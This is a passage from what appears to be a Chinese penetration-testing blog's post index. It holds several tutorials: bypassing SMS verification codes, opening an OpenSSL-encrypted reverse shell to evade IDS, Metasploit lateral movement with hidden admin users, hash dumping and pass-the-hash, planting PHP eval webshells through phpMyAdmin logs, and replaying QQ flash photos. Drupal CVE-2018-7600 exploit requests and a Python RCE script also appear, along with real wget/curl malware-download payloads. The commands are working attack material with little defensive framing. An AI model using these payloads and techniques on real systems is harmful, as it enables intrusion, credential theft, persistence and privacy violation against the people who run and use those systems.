对于6位纯数字验证码：六位数的验证码1000000位，单从爆破时间上来看就比4位数的多100倍。 三、验证码回显验证码在返回包，观察包即可 四、验证码绕过用户绑定了手机号，正常来说是获取绑定手机号的短信，通过burp修改成其他手机号 把这个手机号改成其他手机号的 点击提交，抓包改成其他刚刚接收短信的手机号 五、验证码转发 加个逗号后面接上需要转发的手机号，因为开发可能使用数组就导致同时把验证码发给两个手机号","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"验证码","slug":"验证码","permalink":"https://wolke.cn/tags/%E9%AA%8C%E8%AF%81%E7%A0%81/"}],"author":"w01ke"},{"title":"OpenSSL反弹加密Shell","slug":"OpenSSL反弹加密Shell","date":"2022-05-13T08:39:35.000Z","updated":"2022-05-13T08:49:54.194Z","comments":true,"path":"post/4904f19c.html","link":"","permalink":"https://wolke.cn/post/4904f19c.html","excerpt":"","text":"一、前言在进行红队渗透测试的后渗透阶段为了进一步横行渗透往往需要反弹 shell，这里列出了使用各种语言进行反弹 shell 的方法，我发现这种反弹 shell 方式都有一个缺点，那就是所有的流量都是明文传输的。 我们使用 nc 反弹 shell 进行测试 Kali: nc -lvp 4444Win7: nc 192.168.1.6 4444 -e cmd 使用 wireshark 可以直接看到我们执行的命令和返回信息 在这种情况下当我们进行操作时，网络防御检测系统(IDS、IPS等)会获取到我们的通信内容并进行告警和阻止，因此需要对通信内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密 shell。 二、OpenSSL简介在计算机网络上，OpenSSL 是一个开放源代码的软件库包，应用程序可以使用这个包来进行安全通信，避免窃听，同时确认另一端连接者的身份 利用 OpenSSL 反弹 shell 之前需要生成自签名证书 三、使用OpenSSL生成自签名证书openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes 生成自签名证书时会提示输入证书信息，如果懒得填写可以一路回车 四、使用OpenSSL反弹加密shell（1）Linux假设我们从 A 主机反弹 shell 到 B 主机 ------------------ ----------------------| A:192.168.1.8 | --- shell ---&gt; | B:192.168.1.6:4444 |------------------ ---------------------- 首先需用利用上一步生成的自签名证书，在 B 主机上使用 OpenSSL 监听一个端口，在这里使用 4444 端口 openssl s_server -quiet -key key.pem -cert cert.pem -port 4444 此时 OpenSSL 在 4444 端口上启动了一个 SSL/TLS server 这时在 A 主机进行反弹 shell 操作，命令为： mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect 192.168.1.6:4444 &gt; /tmp/s; rm /tmp/s 这样就使用 OpenSSL 反弹了一个加密的 shell 效果如下： 使用 wireshark 抓包可以看到，A 和 B 主机之间在使用 TLS1.2 协议进行加密通信 （2）Windows在 Windows 系统上反弹加密 shell 的方式有点不一样 具体命令如下： openssl s_client -quiet -connect [ip]:[port1] | cmd.exe | openssl s_client -quiet -connect [ip]:[port2] 以上命令会从 [ip]:[port1] 获取命令发送给 cmd.exe执行，然后把结果返回到 [ip]:[port2] 因此在本机需要启动两个 s_server 从 port1 发送命令到 cmd openssl s_server -quiet -key [keyfile] -cert [cert] -port [port1] 从 port2 获取发送给 port1 的命令执行结果 openssl s_server -quiet -key [keyfile] -cert [cert] -port [port2] 五、使用 OpenSSL 搭建简易 HTTPS Server使用以下命令前需要使用 OpenSSL 生成证书自签名证书，命令在上文中已给出 openssl s_server -key key.pem -cert cert.pem -accept 44330 -WWW 以上命令在 44330 端口启动了一个 HTTPS Server","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"OpenSSL","slug":"OpenSSL","permalink":"https://wolke.cn/tags/OpenSSL/"}],"author":"w01ke"},{"title":"使用Kali进行内网渗透","slug":"使用Kali进行内网渗透","date":"2022-05-07T13:40:12.000Z","updated":"2022-05-14T09:08:16.548Z","comments":true,"path":"post/fd7d7a05.html","link":"","permalink":"https://wolke.cn/post/fd7d7a05.html","excerpt":"","text":"一、网络拓扑图假如我们拿到了一台主机比如Win2008的shell，如何通过该主机进行内网渗透，拿到比如下图中数据服务器的最高权限？ 二、Win2008主机上线msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.6 lport=4444 -f exe &gt; /var/www/html/w01ke.exemsfconsoleuse exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost 192.168.0.196ser lport 4444exploit 三、简单信息收集信息收集之前可以输入help了解一下meterpreter下的命令，其中有信息收集，提权等多个模块，自行了解 （1）查看目标主机当前用户与权限meterpreter &gt; getuid （2）查看目标主机系统相关信息meterpreter&gt; sysinfo （3）查看目标主机路由表meterpreter &gt; route （4）查看目标主机运行进程meterpreter&gt; ps 四、迁移/注入进程我们的木马w01ke.exe如果我们退出了shell会话或者对方关机，我们都会丢失对目标主机Win2008的控制，我们可以将进程注入到目标主机Win2008的常用进程，这样每次目标主机Win2008启动了被注入的服务进程，我们的木马也会上线 这里我们选择注入到explorer.exe，通过上面的信息收集可以知道进程explorer.exe的PID为1560，w01ke.exe的PID为2016 使用以下命令进行迁移 meterpreter&gt; migrate 1560 此时再次查看目标主机进程，已经没有w01ke.exe了 五、提权meterpreter&gt; getuid 查看当前用户meterpreter&gt; getprivs 尽可能提升权限meterpreter&gt; getsystem 通过各种攻击向量来提升系统用户权限 六、持久后门：添加隐藏用户meterpreter &gt; shell C:\\Windows\\system32&gt;net user test$ 123456 /add &amp; net localgroup administrators test$ /add 七、扫描内网存活主机meterpreter&gt; info post/multi/gather/ping_sweepmeterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.1-10.10.10.5meterpreter&gt; run post/multi/gather/ping_sweep rhosts=10.10.10.0/24这个模块会尝试ping内网的主机，如果有回包，说明该主机存活 meterpreter&gt; info post/windows/gather/arp_scannermeterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.1-10.10.10.5meterpreter&gt; run post/windows/gather/arp_scanner rhosts=10.10.10.0/24这个模块会尝试发送arp包，如果有回包，说明该主机存活 八、添加内网路由meterpreter&gt; run autoroute -s 10.10.10.0/24meterpreter&gt; run autoroute -p或者meterpreter&gt; run post/multi/manage/autoroute 九、扫描内网主机开放的端口通过MSF SOCKS代理模块，用nmap扫描内网主机开放的端口 （1）配置SOCKS代理meterpreter&gt; backgroundmsf6 exploit(multi/handler) &gt; use auxiliary/server/socks_proxymsf6 auxiliary(server/socks_proxy) &gt; set srvhost 192.168.1.8(Win2008的IP)msf6 auxiliary(server/socks_proxy) &gt; exploit -j 修改proxychains配置 vim /etc/proxychains4.conf （2）使用nmap进行扫描proxychains nmap -sT -Pn -sV -p 22,80,445,3306 10.10.10.128-129 --open -oN 10.10.10.0.txt 看到数据服务器10.10.10.128开启了445端口，那么就可以考虑Hash传递攻击（直接使用密文登录） 十、攻击内网主机看到数据服务器10.10.10.128开启了445端口，那么就可以考虑Hash传递攻击（直接使用密文登录） （1）提取Win2008的密码Hashmeterpreter&gt; hashdumpAdministrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: 以aad3b435开头的哈希值是一个空的或不存在的哈希值（空字串的占位符） windows系统存储哈希值的方式一般为LAN Manager（LM）、NT LAN Manager（NTLM），或NT LAN Manager v2（NTLMv2）。 在LM存储方式中，当用户首次输入密码或更改密码的时候，密码被转换为哈希值，由于哈希长度的限制，将密码切分为7个字符一组的哈希值。以password123456的密码为例，哈希值以passwor和d123456的方式存储，所以攻击者只需要简单地破解7个字符一组的密码，而不是原始的4个字符。而NTLM的存储方式跟密码长度无关，密码password123456将作为整体转换为哈希值存储。 而上面aad3b435b51404eeaad3b435b51404ee是LM哈希，afffeba176210fad4628f0524bfe1942是NTLM哈希 （2）配置SMB攻击模块，传递哈希msf6 auxiliary(server/socks_proxy) &gt; use exploit/windows/smb/psexecmsf6 exploit(windows/smb/psexec) &gt; set payload windows/meterpreter/bind_tcp这里不能用reverse_tcp了因为这是内网环境了没办法弹回我们外网的kali来（除非做了隧道），因此我们使用正向连接msf6 exploit(windows/smb/psexec) &gt; set rhosts 10.10.10.128msf6 exploit(windows/smb/psexec) &gt; set smbuser Administrator这里的smbuser设置为Administrator是因为上一步获取hash时得到了Administratormsf6 exploit(windows/smb/psexec) &gt; set smbpass aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942msf6 exploit(windows/smb/psexec) &gt; exploit 由于数据服务器Win7的Administrator账户已被禁用，因此报错了 为了实验顺利进行，取消禁用 再次exploit，成功控制数据服务器Win7 （3）利用 kiwi(mimikatz) 进行信息收集meterpreter &gt; load kiwiKiwi Commands=============Command Description------- -----------creds_all Retrieve all credentials (parsed)creds_kerberos Retrieve Kerberos creds (parsed)creds_livessp Retrieve Live SSP credscreds_msv Retrieve LM/NTLM creds (parsed)creds_ssp Retrieve SSP credscreds_tspkg Retrieve TsPkg creds (parsed)creds_wdigest Retrieve WDigest creds (parsed)dcsync Retrieve user account information via DCSync (unparsed)dcsync_ntlm Retrieve user account NTLM hash, SID and RID via DCSyncgolden_ticket_create Create a golden kerberos ticketkerberos_ticket_list List all kerberos tickets (unparsed)kerberos_ticket_purge Purge any in-use kerberos ticketskerberos_ticket_use Use a kerberos ticketkiwi_cmd Execute an arbitary mimikatz command (unparsed)lsa_dump_sam Dump LSA SAM (unparsed) 查看目标系统的 SAMdump：lsa_dump_secrets Dump LSA secrets (unparsed) 查看目标系统的密码password_change Change the password/hash of a userwifi_list List wifi profiles/creds for the current userwifi_list_shared List shared wifi profiles/creds (requires SYSTEM) 可以看到明文密码123456（如果没有明文可以尝试暴力破解） （4）开启远程桌面Usage: run getgui -u &lt;username&gt; -p &lt;password&gt;Or: run getgui -eOPTIONS: -e Enable RDP only. -f &lt;opt&gt; Forward RDP Connection. -h Help menu. -p &lt;opt&gt; The Password of the user to add. -u &lt;opt&gt; The Username of the user to add. 开启远程桌面服务 （5）远程连接① 使用之前部署好的proxychainsproxychains rdesktop -u Administrator -p 123.com 10.10.10.128:3389 ② 使用端口转发meterpreter &gt; portfwd add -l 13389 -p 3389 -r 10.10.10.128rdesktop -u Administrator -p 123.com 127.0.0.1:13389","categories":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wolke.cn/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"Kali","slug":"Kali","permalink":"https://wolke.cn/tags/Kali/"}],"author":"w01ke"},{"title":"phpMyAdmin提权","slug":"phpMyAdmin提权","date":"2022-04-28T08:09:47.000Z","updated":"2022-04-28T08:19:38.161Z","comments":true,"path":"post/3256b484.html","link":"","permalink":"https://wolke.cn/post/3256b484.html","excerpt":"","text":"一、条件 能成功登录到phpMyAdmin里去 有读、写、执行的权限 知道网站的绝对路径 二、操作步骤1、爆数据库安装路径（1）SQL语句查询SHOW GLOBAL VARIABLES LIKE &quot;%datadir%&quot;;select @@basedir; 因为phpstudy是集成环境，所以网站物理路径是D:\\phpstudy_pro\\WWW （2）敏感文件直接在url后面输入phpinfo.php，看看能不能读出这个文件，如果存在就会把网站的绝对路径显示出来，这样的情况特少，因为网站管理人员不可能把这个测试页面在互联网上面直接显示出来，他们或许会更改路径或许会设置目录访问权限； （3）扫描网站使用扫描工具对网站进行扫扫描；扫描一些phpinfo.php info.php php.php test.php等等； （4）读取配置文件 Windows2003 IIS 6 C:\\Windows/system32\\inetsrv\\metabase.xml Win2008/2012 IIS 7.5 C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config Nginx /etc/nginx/conf.d/vhost.conf /usr/local/etc/nginx/nginx.conf Apache /etc/httpd/conf/httpd.conf/usr/local/apache2/conf/httpd.conf 2、查看secure_file_priv在上面我们已经获知了网站默认的路径，这个时候我们肯定想插入一句话后门文件或者是导出shell。那如果我们需要使用以上两种思路中的一种必须满足一个前提条件secure_file_priv对应的值不能为空且必须为默认网站的路径，所以我们必须提前检测一下secure_file_priv的值。 secure_file_priv为null 表示不允许导入导出； secure_file_priv指定文件夹时，表示mysql的导入导出只能发生在指定的文件夹； secure_file_priv没有设置时，则表示没有任何限制； SHOW VARIABLES LIKE &quot;%secure_file_priv%&quot;; 从上图得知值为空，如果我们这时导入一句话，肯定会失败的 SELECT &#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27; INTO OUTFILE &#x27;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke.php&#x27;; 如果要解决这个问题，我们可以通过下面2种方式： 将你要导入或导出的文件位置指定到你设置的路径里，也就是动态修改 SET GLOBAL secure_file_priv = &quot;D:/phpstudy_pro/WWW&quot;; 由于不能动态修改，我们可以修改my.cnf里关于这个选项的配置，然后重启即可。 但平常都是黑盒测试，有没有其他方法呢，有 3、利用日志文件或备份文件来写入一句话（1）日志文件点击变量选项，搜索gen就会出来general_log和general_log_file这两个变量，general_log变量是指是否启动记录日志；而general_log_file指的是日志文件的路径，可以看到general_log变量的状态为OFF，故我们要修改为ON；general_log_file变量中的*.log的后缀我们改为*.php。拿完webshell记得要改回去哟。 ① 开启日志SET GLOBAL general_log = &quot;ON&quot;; ② 修改日志文件保存的位置SET GLOBAL general_log_file = &quot;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke.php&quot;; w01ke.php的内容是日志文件，包括执行的SQL语句 ③ 写入一句话SELECT &#x27;&lt;?php @eval($_POST[w01ke]);?&gt;&#x27;; ④ 查看修改后的信息（随便）SHOW VARIABLES LIKE &quot;%general%&quot;; 默认情况如下 （2）备份文件① 开启备份日志SET GLOBAL slow_query_log = &quot;ON&quot;; ② 修改备份日志文件保存的位置SET GLOBAL slow_query_log_file= &quot;D:\\\\phpstudy_pro\\\\WWW\\\\w01ke2.php&quot;; ③ 写入一句话备份的，根据其他师傅尝试，需要用延迟才能成功注入 SELECT 99999999999999999,&#x27;&lt;?php @eval($_POST[w01ke2]);?&gt;&#x27; OR sleep(11); ④ 查看修改后的信息（随便）SHOW VARIABLES LIKE &quot;%slow_query_log%&quot;; 默认情况下 4、蚁剑连接 5、提权（1）抓取hash密码上传抓取hash密码的工具，成功抓取到管理员密码： （2）添加新用户到管理员组在虚拟终端添加测试账号test$，并将用户添加到管理员组： （3）开启3389端口经查询主机未开启3389远程登陆功能，故上传开启3389的bat文件进行开启： （4）关闭防火墙netsh advfirewall set allprofiles state off （5）远程连接成功连接服务器，由于本机administrator没有设置密码，故只是拿自己的登陆名称进行测试，在实际站点测试的时候一般都有管理员密码，只不过有的服务器的登陆用户名会修改(遇到的情况有的特别变态，比如端口修改、用户名修改、防护软件等)： 三、参考链接 https://blog.csdn.net/ga421739102/article/details/103924232 https://zhuanlan.zhihu.com/p/55466863","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/tags/Web%E5%AE%89%E5%85%A8/"},{"name":"phpMyAdmin","slug":"phpMyAdmin","permalink":"https://wolke.cn/tags/phpMyAdmin/"}],"author":"w01ke"},{"title":"如何纯手工破解QQ闪照？不限次数观看","slug":"如何纯手工破解QQ闪照？不限次数观看","date":"2022-04-22T02:49:38.000Z","updated":"2022-04-22T04:52:45.741Z","comments":true,"path":"post/a5c589f5.html","link":"","permalink":"https://wolke.cn/post/a5c589f5.html","excerpt":"","text":"一、杂谈有的时候遇到心仪的女/男孩子发照片，或者是hxd发的好东西，或者是一些涉及信息泄露的照片，大多数都是以闪照的形式接收。但如果想反复查看几次，应该怎么办呢？ 下面教大家手工的方式实现无限次观看闪照，分为视频教程和图文演示 二、视频教程(function(){var player = new DPlayer({\"container\":document.getElementById(\"dplayer1\"),\"theme\":\"#da4e7f\",\"screenshot\":true,\"video\":{\"url\":\"/video/2022042201.mp4\",\"pic\":\"https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1650599015839-05a1e65d-5801-400f-8688-93b08967ffb1.jpeg\"}});window.dplayers||(window.dplayers=[]);window.dplayers.push(player);})() 三、图文演示我们正常收到闪照查看5秒完毕后，闪照会自动销毁 此时我们点右上角 删除聊天记录（删除漫游记录不勾选） 然后我们点击查找聊天记录 选择全部 发现闪照又回来了，可以继续长按查看 或者直接回到聊天界面，又可以重复打开观看了 查看后，此时闪照又销毁了，我们只需要重复删除聊天记录（取消勾选漫游）–查看聊天记录–选择全部，这样就又可以查看闪照了","categories":[{"name":"社工","slug":"社工","permalink":"https://wolke.cn/categories/%E7%A4%BE%E5%B7%A5/"}],"tags":[{"name":"社工","slug":"社工","permalink":"https://wolke.cn/tags/%E7%A4%BE%E5%B7%A5/"},{"name":"QQ技术","slug":"QQ技术","permalink":"https://wolke.cn/tags/QQ%E6%8A%80%E6%9C%AF/"}],"author":"w01ke"},{"title":"HTTP.sys远程代码执行（CVE-2015-1635）","slug":"HTTP-sys远程代码执行（CVE-2015-1635）","date":"2022-04-19T04:03:42.000Z","updated":"2022-04-19T04:26:27.306Z","comments":true,"path":"post/bd0dfd63.html","link":"","permalink":"https://wolke.cn/post/bd0dfd63.html","excerpt":"","text":"前言最近和师傅们参与了一些众测项目，发现师傅们提交了很多关于HTTP.sys远程代码执行的漏洞，于是在网上搜集了些资料进行学习 一、漏洞概述1、HTTP.sys简介HTTP.sys是Microsoft Windows处理HTTP请求的内核驱动程序，为了优化IIS服务器性能，从IIS6.0引入，IIS服务进程依赖HTTP.sys。HTTP.sys远程代码执行漏洞实质是HTTP.sys的整数溢出漏洞 我们通过给IIS服务器发送这样格式的HTTP请求，就可以触发（检测）这个漏洞： GET / HTTP/1.1Host: stuffRange: bytes=0-18446744073709551615 若IIS服务器返回“Requested Range Not Satisfiable”，则是存在漏洞，否则如果返回“The request has an invalid header name”，则说明漏洞已经修补。 2、漏洞成因远程执行代码漏洞存在于 HTTP 协议堆栈 (HTTP.sys) 中，当HTTP.sys未正确分析经特殊设计的 HTTP 请求时会导致此漏洞 3、漏洞危害攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃。 4、影响版本任何安装了微软IIS 6.0以上的的Windows 7、Windows Server 2008 R2、 Windows Server 2012 R2 、Windows Server 2012、Windows 8.2、Windows 8.1 系统 二、漏洞环境部署环境部署：windows7下安装IIS服务 如果发现安装完成后，机子上仍没有IIS服务，建议查看以下win7的版本（桌面的计算机单击右键属性，即可查看），旗舰版、企业版和专业版有IIS功能，家庭版和简易版是没有的。需要将家庭版升级为旗舰版即可。 升级办法可参考：http://jingyan.baidu.com/article/08b6a591ed82d314a809228d.html 安装成功！启动即可，不作任何设置。 访问下当前IP地址，查看IIS版本 三、漏洞验证靶机Win7：192.168.43.155 攻击机Kali：192.168.43.167 1、使用curl、wget命令进行测试curl http://192.168.43.155 -H &quot;Host: 192.168.43.155&quot; -H &quot;Range: bytes=0-18446744073709551615&quot;或者wget 192.168.43.155 -–debug -–header=&quot;Range: bytes=0-18446744073709551615&quot; 返回416，说明该系统存在漏洞，其中Range字段值18446744073709551615表示：转为十六进制是 0xFFFFFFFFFFFFFFFF(16个F），是64位无符号整型所能表达的最大整数，整数溢出往往和这个超大整数有关。 2、使用Python脚本验证：CVE-2015-1635 POCPOC链接：https://github.com/w01ke/CVE-2015-1635-POC 3、burpsuite抓包测试 四、漏洞利用1、ms15_034内存读取打开msfconsole，搜索ms15_034 利用ms15_034漏洞读取服务器内存数据：不知道为什么没有显示内存数据…… 2、ms15_034 ddos攻击 攻击成功：windows7蓝屏，蓝屏后会自动重启 五、漏洞防御禁用IIS的内核缓存：可能导致IIS性能降低 缓解方案：https://technet.microsoft.com/en-us/library/cc731903(v=ws.10).aspx 升级补丁：https://docs.microsoft.com/zh-cn/security-updates/Securitybulletins/2015/ms15-034?redirectedfrom=MSDN 双击输出缓存中的办法：https://blog.csdn.net/u010082526/article/details/84955085 六、参考链接https://blog.csdn.net/qq_41210745/article/details/103437683","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://wolke.cn/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"中间件漏洞","slug":"中间件漏洞","permalink":"https://wolke.cn/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"},{"name":"IIS","slug":"IIS","permalink":"https://wolke.cn/tags/IIS/"}],"author":"w01ke"},{"title":"Drupal远程代码执行（CVE-2018-7600）","slug":"Drupal远程代码执行（CVE-2018-7600）","date":"2022-04-09T01:50:32.000Z","updated":"2022-04-09T02:12:05.459Z","comments":true,"path":"post/5279f9a1.html","link":"","permalink":"https://wolke.cn/post/5279f9a1.html","excerpt":"","text":"一、漏洞简介Drupal是一个开源内容管理系统（CMS），全球超过100万个网站（包括政府，电子零售，企业组织，金融机构等）使用。Drupal安全团队披露了一个非常关键的漏洞，编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。 二、漏洞原理该漏洞的产生的根本原因在于Drupal对表单的渲染上。 Drupal为了在表单渲染过程中能够动态修改数据，从6.x版本开始便引入了“Drupal Form API”的概念。 相关文档如下：https://api.drupal.org/api/drupal/elements/8.6.x 这些“可渲染的数组(Renderable arrays)”就是引发此次漏洞的”元凶”，它由一个key-value结构存储，其中key都以#(hash sign)开头，如下所示 [ ‘#type’ =&gt; ‘markup’, ‘#markup’ =&gt; ‘&lt;em&gt;some text&lt;/em&gt;’, ‘#prefix’ =&gt; ‘&lt;div&gt;’, ‘#suffix’ =&gt; ‘&lt;/div&gt;’ ] Drupal在渲染这些“数组”时，将其中的数据未经安全过滤传入到doRender函数中。 以下是doRender函数调用call_user_func_array函数的代码片段： 该方法取出”可渲染数组”#lazy_builder的值，未经过滤直接传入call_user_func_array函数，导致恶意代码被执行。 攻击链路还原如下： 黑客在“可渲染数组”中插入构造恶意代码，如：mail[#post_render][]=恶意代码 通过POST方法将含有恶意代码的“可渲染数组”提交到drupal系统中。 页面渲染流程中，“可渲染数组”中携带的恶意代码依次经过buildform-&gt;uploadAjaxCallback-&gt;renderRoot-&gt;doRender方法。 最终doRender方法将“可渲染数组”中的恶意代码取出，传入call_user_func函数，导致恶意代码被执行，成功触发漏洞，网站沦陷。 相关代码：https://github.com/drupal/drupal/blob/8.6.x/core/lib/Drupal/Core/Render/Renderer.php 三、影响版本Drupal 6.xDrupal 7.xDrupal 8.x 四、漏洞利用自从漏洞CVE-2018-7600公布开始，阿里云安全技术实验室就持续跟踪和监控该漏洞的利用情况，发现黑客从2018-04-12开始就已经进行了大批量的漏洞攻击。从最近这段时间监控到的数据发现，已有多个黑客组织开始使用该漏洞来从事黑产活动。 1、挖矿牟利 我们捕获到黑客精心构造POST数据，利用Drupal漏洞进行攻击，实现挖矿盈利。具体样例如下： mail[#markup]=wget -q http://67.231.243.10:8220/logo4.jpg -O - | sh&amp;mail[#type]=markup&amp;form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec logo4.jpg实际是一个shell脚本，该shell脚本有两个功能： 尝试结束市面上其他挖矿进程；其部分代码如下： 下载挖矿程序和挖矿程序配置脚本，并开始挖矿。 拿到黑客的钱包地址后，我们在某个矿池中发现该黑客已经获得了75.87个门罗币，根据市场门罗币的行情预估，该黑客单在这一个矿池中就已经牟利11W，而且该地址的门罗币数量再以每天两个的数量在递增，其中利润之大可见一斑。 2、构建BillGates僵尸网络黑客执行 wget -c -P /etc/ http://111.73.46.196:9876/sysxlv 命令，下载BillGates木马，用于构建自己的僵尸网络。 该僵尸网络的相关信息： 活跃时间：2018-02-14 ~ 至今 中控IP：111.73.46.196 相关域名：xvw.f3322.net 关联样本：e05747461650ae6688fe0ed2b1104f0e 截至目前，影响云上用户趋势图如下： 3、收集信息并传播Mirai僵尸网络黑客通过下发恶意shell代码，传播Mirai僵尸网络。 下图是shell通过wget将用户机器信息POST到tc8zdw.if1j0ytgkypa.tk： 数据各个字段的值均用base64加密过，解密后如下： 上传信息字段名字段base64解码后的值 version EXD act up，表示上传 uid uid=0(root) gid=0(root) groups=0(root) uname Linux iZt4ncf567x3bguk2zv6haZ 2.6.32-696.16.1.el6.x86_64 #1 SMP Wed Nov 15 16:51:15 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux arch 64，表示64为操作系统 network process 名为64的程序实际是一个Loader，负责判断环境，然后下载不同版本的Mirai僵尸网络。除此之外还会执行其他payload，如 curl -fsSL http://tc8zdw.if1j0ytgkypa.tk/64 -o /tmp/57332442。 入侵趋势 阿里云安全技术实验室从漏洞公布开始即密切关注云上该漏洞利用情况，发现云上批量攻击始于2018-04-12日，并快速增长，随着阿里云各个安全产品的联动拦截以及引导用户进行漏洞修复后，入侵趋势已基本下降下来。 威胁评估 本次补丁公布的时间点领先了批量漏洞利用时间点，用户拥有两周时间来进行安全更新。于此同时，云盾态势感知通用入侵检测模型在漏洞详情为公布前已经实现自动覆盖并向用户推送告警，目前绝大部分Drupal用户已经修复此漏洞，据最近一次入侵趋势观测结果(2018.04.18)显示，公有云存在漏洞的Drupal服务仅有2.6%。 与同类RCE漏洞相比，现阶段 Drupal(Drupalgeddon 2) 杀伤力未进入RCE漏洞第一梯队。 五、POC访问Drupal靶场 POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length: 107form_id=user_register_form&amp;_drupal_ajax=1&amp;mail[#post_render][]=exec&amp;mail[#type]=markup&amp;mail[#markup]=id【替换id执行命令】POST /user/register?element_parents=account/mail/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax HTTP/1.1Host: ip:8080User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: application/json, text/javascript, */*; q=0.01Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateReferer: http://172.18.0.1:8080/user/registerX-Requested-With: XMLHttpRequestContent-Type: multipart/form-data; boundary=---------------------------99533888113153068481322586663Content-Length: 625Connection: close-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#post_render][]&quot;passthru-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#type]&quot;markup-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;mail[#markup]&quot;whoami-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;form_id&quot;user_register_form-----------------------------99533888113153068481322586663Content-Disposition: form-data; name=&quot;_drupal_ajax&quot; 交互式命令执行python3脚本： 使用python2 RCE.py http://127.0.0.1:8080 import requestsimport refrom sys import argvdomain = argv[1]def exploit(command): HOST=domain get_params = &#123;&#x27;q&#x27;:&#x27;user/password&#x27;, &#x27;name[#post_render][]&#x27;:&#x27;passthru&#x27;, &#x27;name[#markup]&#x27;:command, &#x27;name[#type]&#x27;:&#x27;markup&#x27;&#125; post_params = &#123;&#x27;form_id&#x27;:&#x27;user_pass&#x27;, &#x27;_triggering_element_name&#x27;:&#x27;name&#x27;&#125; r = requests.post(HOST, data=post_params, params=get_params) m = re.search(r&#x27;&lt;input type=&quot;hidden&quot; name=&quot;form_build_id&quot; value=&quot;([^&quot;]+)&quot; /&gt;&#x27;, r.text) if m: found = m.group(1) get_params = &#123;&#x27;q&#x27;:&#x27;file/ajax/name/#value/&#x27; + found&#125; post_params = &#123;&#x27;form_build_id&#x27;:found&#125; r = requests.post(HOST, data=post_params, params=get_params) print(&quot;\\n&quot;.join(r.text.split(&quot;\\n&quot;)[:-1]))while True: command = raw_input(&#x27;$ &#x27;) exploit(command) 六、应对策略官方已经修复此漏洞，请及时更新Drupal版本或参考补丁自行修复： Drupal 7.x 请更新至7.58版本(https://www.drupal.org/project/drupal/releases/7.58) 或参考此补丁进行修复 (https://cgit.drupalcode.org/drupal/rawdiff/?h=7.x&amp;id=2266d2a83db50e2f97682d9a0fb8a18e2722cba5) Drupal 8.3.x 请更新至8.3.9版本(https://www.drupal.org/project/drupal/releases/8.3.9) 或参考此补丁进行修复(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) Drupal 8.4.x 请更新至8.4.6版本(https://www.drupal.org/project/drupal/releases/8.4.6) 或参考此补丁进行修复(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) Drupal 8.5.x 请更新至8.5.1版本(https://www.drupal.org/project/drupal/releases/8.5.1) 或参考此补丁进行修复(https://cgit.drupalcode.org/drupal/rawdiff/?h=8.5.x&amp;id=5ac8738fa69df34a0635f0907d661b509ff9a28f) 七、参考链接 https://developer.aliyun.com/article/584991 